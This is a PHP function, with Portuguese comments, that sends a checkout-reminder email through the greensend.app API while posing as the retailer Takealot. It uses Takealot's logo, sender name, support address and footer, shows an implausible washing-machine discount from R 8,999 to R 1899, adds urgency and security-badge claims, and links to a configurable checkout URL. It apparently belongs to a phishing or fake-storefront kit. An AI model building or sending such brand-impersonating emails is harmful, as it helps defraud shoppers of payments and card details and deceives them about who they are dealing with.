<?php
/**
 * Helper para envio de e-mail de RECUPERAÇÃO DE CHECKOUT via Green Send (greensend.app)
 */

function sendTakealotRecoveryEmail($params) {
    $apiKey = getenv('GREEN_SEND_API_KEY');
    
    // Fallback para arquivo .env
    if (empty($apiKey) && file_exists(__DIR__ . '/../.env')) {
        $envLines = file(__DIR__ . '/../.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($envLines as $line) {
            if (strpos(trim($line), '#') === 0) continue;
            if (strpos($line, '=') !== false) {
                list($k, $v) = explode('=', $line, 2);
                if (trim($k) === 'GREEN_SEND_API_KEY') {
                    $apiKey = trim($v);
                    break;
                }
            }
        }
    }

    if (empty($apiKey)) {
        $apiKey = "";
    }

    $toEmail = $params['email'] ?? '';
    if (empty($toEmail) || !filter_var($toEmail, FILTER_VALIDATE_EMAIL)) {
        return ['success' => false, 'error' => 'Invalid recipient email'];
    }

    $name = $params['name'] ?? 'Valued Customer';
    $amount = $params['amount'] ?? 1899;
    $qty = $params['quantity'] ?? 1;
    $productTitle = $params['product_title'] ?? 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)';
    $checkoutUrl = $params['checkout_url'] ?? 'http://localhost:3015/checkout.html';

    // Imagem da Washing Machine correspondente
    $is75 = (strpos($productTitle, '75') !== false);
    $productImage = $is75 ? 'https://iili.io/oKD3ZQa.jpg' : 'https://iili.io/oKD3ZQa.jpg';
    $oldPrice = $is75 ? '4,999' : '8,999';

    $subject = "Don't miss out: Your Takealot order is reserved for you!";

    // Plain text version
    $textBody = "Hi {$name},\n\n"
              . "Did you forget something? Your order for the {$productTitle} is currently reserved in your cart at the promotional price of R {$amount}.\n\n"
              . "Due to high demand, we can only hold promotional stock for a limited time.\n\n"
              . "Click here to complete your order:\n{$checkoutUrl}\n\n"
              . "Thanks,\nThe Takealot Team\nsupport@takealot.co.za";

    // Official Takealot Recovery HTML Template
    $htmlBody = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Complete Your Order</title>
<style>
  body { margin: 0; padding: 0; background-color: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: #333333; }
  .email-container { max-width: 600px; margin: 20px auto; background: #ffffff; border-radius: 8px; overflow: hidden; border: 1px solid #e1e4e8; }
  .email-header { background-color: #ffffff; padding: 26px 20px; text-align: center; border-bottom: 2px solid #0b56a4; }
  .email-logo { display: block; margin: 0 auto; max-width: 190px; height: auto; }
  .email-content { padding: 32px 26px; }
  .urgency-badge { display: inline-block; background-color: #fff1f2; color: #e11d48; padding: 6px 14px; border-radius: 20px; font-size: 12.5px; font-weight: 800; margin-bottom: 20px; letter-spacing: 0.3px; border: 1px solid #fecdd3; }
  .greeting { font-size: 20px; font-weight: 800; color: #0b56a4; margin-top: 0; margin-bottom: 12px; }
  .info-box { background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 18px; margin: 22px 0; }
  .cta-btn { display: block; text-align: center; background-color: #0b56a4; color: #ffffff !important; text-decoration: none; padding: 16px 24px; border-radius: 6px; font-size: 16px; font-weight: 800; margin: 26px 0 14px; letter-spacing: 0.3px; box-shadow: 0 4px 12px rgba(11, 86, 164, 0.25); }
  .cta-btn:hover { background-color: #084382; }
  .trust-row { display: flex; justify-content: space-around; background: #f8fafc; border-radius: 6px; padding: 14px 10px; margin-top: 24px; text-align: center; font-size: 11.5px; color: #475569; border: 1px solid #e2e8f0; }
  .email-footer { background-color: #f1f5f9; padding: 22px; text-align: center; font-size: 11.5px; color: #64748b; line-height: 1.6; border-top: 1px solid #e2e8f0; }
</style>
</head>
<body>
<div class="email-container">
  <!-- HEADER -->
  <div class="email-header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Takealot_logo.svg/500px-Takealot_logo.svg.png" alt="takealot.com" class="email-logo" width="190" />
  </div>

  <!-- CONTENT -->
  <div class="email-content">
    <div class="urgency-badge">⏳ LIMITED TIME: PROMOTIONAL PRICE RESERVED</div>
    
    <h2 class="greeting">Hi {$name},</h2>
    
    <p style="font-size: 14.5px; line-height: 1.6; color: #4a5568; margin-top: 0;">
      We noticed you started checking out on Takealot, but didn't finish your order! Good news: we have temporarily saved the items in your cart so you won't lose this special promotional deal.
    </p>

    <!-- PRODUCT CARD -->
    <div class="info-box">
      <div style="font-size: 11.5px; font-weight: 700; color: #64748b; text-transform: uppercase; margin-bottom: 12px; border-bottom: 1px solid #e2e8f0; padding-bottom: 6px;">
        Reserved Item in Your Cart
      </div>
      
      <table style="width: 100%; border-collapse: collapse;">
        <tr>
          <td style="width: 84px; vertical-align: top; padding-right: 14px;">
            <img src="{$productImage}" alt="Samsung 9kg Washing Machine" width="80" height="80" style="display: block; width: 80px; height: 80px; object-fit: contain; border: 1px solid #e2e8f0; border-radius: 6px; background-color: #ffffff; padding: 3px;" />
          </td>
          <td style="vertical-align: top;">
            <div style="font-size: 14px; font-weight: 700; color: #1a202c; line-height: 1.4;">{$productTitle}</div>
            <div style="font-size: 12px; color: #64748b; margin-top: 4px;">Quantity: {$qty} &bull; Condition: Brand New &bull; Fast Delivery</div>
            <div style="margin-top: 8px;">
              <span style="font-size: 17px; font-weight: 800; color: #0b56a4;">R {$amount}</span>
              <span style="font-size: 13px; color: #94a3b8; text-decoration: line-through; margin-left: 6px;">R {$oldPrice}</span>
              <span style="display: inline-block; background: #e0f2fe; color: #0369a1; font-size: 11px; font-weight: 700; padding: 2px 6px; border-radius: 4px; margin-left: 6px;">SPECIAL DEAL</span>
            </div>
          </td>
        </tr>
      </table>
    </div>

    <!-- CTA BUTTON -->
    <a href="{$checkoutUrl}" class="cta-btn" target="_blank">
      Complete Your Order Now &rarr;
    </a>

    <p style="font-size: 12.5px; color: #718096; text-align: center; margin: 16px 0 0;">
      Safe, encrypted &amp; verified 3D-Secure payment. Free delivery included.
    </p>

    <!-- TRUST BADGES -->
    <table style="width: 100%; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 6px; margin-top: 24px; text-align: center; font-size: 12px; color: #475569; padding: 12px 6px;">
      <tr>
        <td style="width: 33.3%;">🔒 <strong>100% Secure</strong><br><span style="font-size: 10.5px; color: #64748b;">3D-Secure Protected</span></td>
        <td style="width: 33.3%; border-left: 1px solid #e2e8f0; border-right: 1px solid #e2e8f0;">🚚 <strong>Fast Delivery</strong><br><span style="font-size: 10.5px; color: #64748b;">Direct to your door</span></td>
        <td style="width: 33.3%;">↩️ <strong>Easy Returns</strong><br><span style="font-size: 10.5px; color: #64748b;">30-Day Hassle Free</span></td>
      </tr>
    </table>
  </div>

  <!-- FOOTER -->
  <div class="email-footer">
    &copy; 2026 Takealot Online (Pty) Ltd. 12th Floor, Takealot Building, 10 Rua Vasco Da Gama Plain, Foreshore, Cape Town, 8001.<br>
    All rights reserved. Customer Support: <a href="mailto:support@takealot.co.za" style="color: #0b56a4; text-decoration: none;">support@takealot.co.za</a>
  </div>
</div>
</body>
</html>
HTML;

    $payload = [
        "idempotency_key" => "tak-recovery-" . md5($toEmail . $productTitle . time()),
        "channel" => "email",
        "sender_name" => "Takealot.com",
        "to" => $toEmail,
        "message" => [
            "subject" => $subject,
            "text" => $textBody,
            "html" => $htmlBody,
            "reply_to" => "support@takealot.co.za"
        ],
        "metadata" => [
            "email_type" => "checkout_recovery",
            "store" => "takealot"
        ]
    ];

    $ch = curl_init("https://greensend.app/v1/messages");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Authorization: Bearer " . $apiKey,
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $responseData = json_decode($response, true) ?: [];
    return [
        'success' => ($httpCode === 200 || $httpCode === 202),
        'http_code' => $httpCode,
        'data' => $responseData
    ];
}
